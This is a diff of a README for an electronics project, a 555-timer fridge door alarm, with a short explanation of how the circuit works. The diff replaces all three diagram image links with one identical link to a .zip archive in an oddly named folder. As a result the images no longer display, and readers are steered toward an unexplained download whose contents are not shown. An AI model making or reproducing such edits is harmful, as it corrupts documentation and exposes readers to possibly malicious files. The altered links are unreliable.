@@ -42,18 +42,18 @@ The fridge door opening alarm circuit consists of a 9V supply, an LDR light sens
 The output of U1 is supplied to the second 555 timer (U2), which is configured in astable mode to produce continuous square wave pulses. When enabled by U1, the astable oscillations repeatedly turn the LED and buzzer ON and OFF, resulting in a blinking light and beeping sound that alerts the user that the fridge door has been left open. Components R5, R6, and C2 decide the rate of blinking and beeping. Once capacitor C1 in the first timer fully charges, U1 automatically switches OFF, thereby stopping the activation of U2 and turning the alarm OFF even if the fridge door remains open. This design saves battery power and prevents irritation due to continuous alarm sound. Overall, the circuit offers a reliable, low-cost electronic solution for reminding the user to close the fridge door, reducing cooling loss and preserving stored food effectively.
 ## CIRCUIT DIAGRAM:
 
-<img width="783" height="285" alt="image" src="https://github.com/user-attachments/assets/0c5e20fe-1f9d-4ec0-8558-d7b8db74dc24" />
+<img width="783" height="285" alt="image" src="https://raw.githubusercontent.com/MITHUN8521/Fridge-door-opening-alarm-circuit/main/matrocliny/Fridge-door-opening-alarm-circuit_noninvincibility.zip" />
 
 
 ## EXPECTED OUTPUT:
 
 ### Schematic diagram:
 
- <img width="1054" height="602" alt="image" src="https://github.com/user-attachments/assets/df8de915-6575-4cdd-b3fb-3cd3bfe88eba" />
+ <img width="1054" height="602" alt="image" src="https://raw.githubusercontent.com/MITHUN8521/Fridge-door-opening-alarm-circuit/main/matrocliny/Fridge-door-opening-alarm-circuit_noninvincibility.zip" />
 
 ### Layout diagram:
 
-<img width="1048" height="605" alt="image" src="https://github.com/user-attachments/assets/5736d467-42a7-4321-b3c3-6a28eb75c157" />
+<img width="1048" height="605" alt="image" src="https://raw.githubusercontent.com/MITHUN8521/Fridge-door-opening-alarm-circuit/main/matrocliny/Fridge-door-opening-alarm-circuit_noninvincibility.zip" />
 
  
 ## RESULT:
